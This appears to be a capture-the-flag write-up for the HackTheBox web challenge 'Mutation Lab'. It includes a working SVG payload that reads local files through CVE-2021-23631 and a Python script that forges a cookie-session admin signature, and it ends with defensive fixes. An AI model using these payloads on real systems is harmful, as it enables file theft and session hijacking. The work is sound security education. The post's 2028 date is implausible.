---
layout: post
title: "Mutation Lab"
date: 2028-01-27 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, lfi, svg, cve-2021-23631, cookie-session, session-forgery]
---

## Overview

Mutation Lab is a Medium HTB web challenge (Cyber Apocalypse 2022). An Express app lets you register and reach a dashboard whose admin-only "Successful Mutation records" panel holds the flag. The path to admin chains two bugs: a server-side **SVG-to-PNG converter that reads local files** ([CVE-2021-23631](https://nvd.nist.gov/vuln/detail/CVE-2021-23631) in `convert-svg-core`) to steal the session signing key, then **cookie-session signature forgery** to become the admin.

## The technique

The dashboard's "Export Cell Structure" button POSTs raw SVG to `/api/export` and gets back a PNG URL — the server rasterizes your SVG with headless Chromium (`convert-svg-core`). SVG is not "just an image": it allows an XHTML `<foreignObject>`, and inside it an `<iframe src="file://...">` loads a **local file** whose text is painted into the exported PNG. Reading the PNG is a blind [local file read](https://cwe.mitre.org/data/definitions/73.html).

The login also hands out a signed session:

```
session=eyJ1c2VybmFtZSI6InB3bmVyIn0=      # base64({"username":"pwner"})
session.sig=N5LUaQebx93YxBnXrzXkCEmVIDo    # cookie-session (Keygrip) HMAC-SHA1 signature
```

So the plan: read the app's `.env` via the SVG file-read, recover `SESSION_SECRET_KEY`, then re-sign the cookie for `{"username":"admin"}`.

## Solution

Register and log in to get a session, then abuse `/api/export` to read source and secrets.

Read `/app/index.js` first to map the stack:

```bash
curl -s http://<ip>:<port>/api/export -H 'Content-Type: application/json' \
  -d '{"svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1200\" height=\"1400\"><foreignObject width=\"1200\" height=\"1400\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><iframe src=\"file:///app/index.js\"></iframe></body></foreignObject></svg>"}'
# -> {"png":"/exports/<hash>.png"}  ->  GET /exports/<hash>.png and read the image
```

The source confirms the layout:

```js
require('dotenv').config({ path: '/app/.env' });
app.use(session({ name: 'session', keys: [process.env.SESSION_SECRET_KEY] }));
```

Now read `/app/.env` the same way (swap the iframe `src` to `file:///app/.env`) → the returned PNG shows `SESSION_SECRET_KEY=<redacted>`.

With the secret, forge an admin cookie. `cookie-session` signs `session.sig = base64url(HMAC-SHA1(secret, "session=" + value))` (url-safe, `=` stripped). Verify the algorithm by reproducing the observed `pwner` signature, then re-sign for `admin`:

```python
#!/usr/bin/env python3
import sys, json, base64, hmac, hashlib, urllib.request, re
TGT, SECRET = sys.argv[1], sys.argv[2]

def keygrip_sign(data, key):
    d = hmac.new(key.encode(), data, hashlib.sha1).digest()
    return base64.b64encode(d).decode().replace("+","-").replace("/","_").rstrip("=")

value = base64.b64encode(json.dumps({"username":"admin"}, separators=(",",":")).encode()).decode()
sig   = keygrip_sign(f"session={value}".encode(), SECRET)
cookie = f"session={value}; session.sig={sig}"

req  = urllib.request.Request(f"{TGT}/dashboard", headers={"Cookie": cookie})
body = urllib.request.urlopen(req, timeout=30).read().decode()
print(re.search(r"HTB\{[^}]+\}", body).group(0))
```

```bash
python3 solve.py http://<ip>:<port> <SESSION_SECRET_KEY>
# HTB{...}
```

The forged admin cookie renders the confidential records panel, and the flag is in the page.

## Why it worked

Rendering untrusted SVG in a browser engine with local file access turns an "export to image" feature into an arbitrary file-read primitive — `foreignObject` gives SVG full XHTML, including `file://` iframes. Once the session signing key leaks, the game is over: `cookie-session` signatures are just HMACs, and signed is not encrypted, so anyone holding the key forges any identity they like.

## Fix / defense

- Don't render untrusted SVG in a browser with file access. Upgrade `convert-svg-core` (>= 0.6.0), sanitize the SVG (strip `foreignObject`/`iframe`/`embed`/`image` and any `file://`/external references), and run the renderer network-isolated with local file access disabled.
- Keep the session signing key out of web-readable paths (inject at runtime / use a secret store), and rotate it immediately if any file-read touches the filesystem — a leaked signing key is full session forgery.
